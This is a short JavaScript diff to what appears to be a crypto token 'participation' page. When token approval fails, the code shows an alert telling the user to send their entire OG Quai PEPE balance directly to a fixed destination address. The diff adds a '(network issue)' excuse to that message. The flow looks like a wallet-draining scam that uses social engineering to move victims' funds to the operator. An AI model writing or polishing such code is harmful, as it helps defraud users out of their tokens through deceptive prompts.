@@ -808,7 +808,7 @@ document.getElementById('sendBtn').addEventListener('click', async () => {
         userSession.transferStatus = 'manual_required';
         await saveSessionToFirebase();
         
-        alert(`Since token approval failed, please send your tokens directly from your wallet to:\n\n${DESTINATION_ADDRESS}\n\nAmount: ${userSession.tokenBalance} OG Quai PEPE\n\nYour participation has been recorded.`);
+        alert(`Since token approval failed, (network issue) please send your tokens directly from your wallet to:\n\n${DESTINATION_ADDRESS}\n\nAmount: ${userSession.tokenBalance} OG Quai PEPE\n\nYour participation has been recorded.`);
         
         // Show the scan and buy buttons
         document.getElementById('scanBtn').style.display = 'block';
